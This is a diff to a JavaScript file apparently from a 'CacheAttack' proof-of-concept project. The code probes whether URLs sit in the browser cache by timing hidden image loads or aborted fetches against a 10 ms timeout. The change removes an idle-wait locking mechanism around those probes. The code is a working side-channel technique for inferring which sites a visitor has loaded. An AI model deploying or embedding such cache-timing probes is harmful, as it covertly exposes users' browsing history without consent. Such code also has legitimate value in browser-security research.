@@ -2,7 +2,6 @@
 
 // NDev 2020 https://github.com/NDevTK/CacheAttack
 const max = 10;
-checkActive = false;
 let firefox = navigator.userAgent.includes("Firefox");
 
 ifCached = (navigator.userAgent.includes("Firefox")) ? ifCached_1Wrap : ifCached_2;
@@ -76,18 +75,8 @@ async function ifCached_1Wrap(url) {
     return true;
 }
 
-function onIdle() {
-	return new Promise((resolve, reject) => {
-		setInterval(_ => {
-			if(!checkActive) resolve();
-		}, 0)
-	});
-}
-
 function ifCached_1(url) {
-    return new Promise(async (resolve, reject) => {
-	await onIdle();
-	checkActive = true;
+    return new Promise((resolve, reject) => {
         let img = new Image(0, 0);
         img.hidden = true;
         img.onerror = _ => {
@@ -100,15 +89,12 @@ function ifCached_1(url) {
         var timeout = setTimeout(_ => {
             img.src = "";
             img.remove();
-            checkActive = false;
             reject();
         }, max);
     });
 }
 
 async function ifCached_2(url) {
-    await onIdle();
-    checkActive = true;
     var state = true;
     var controller = new AbortController();
     var signal = controller.signal;
@@ -123,7 +109,6 @@ async function ifCached_2(url) {
 	    clearTimeout(timeout);
 	}
     clearTimeout(timeout);
-    checkActive = false;
     return state;
 }
 
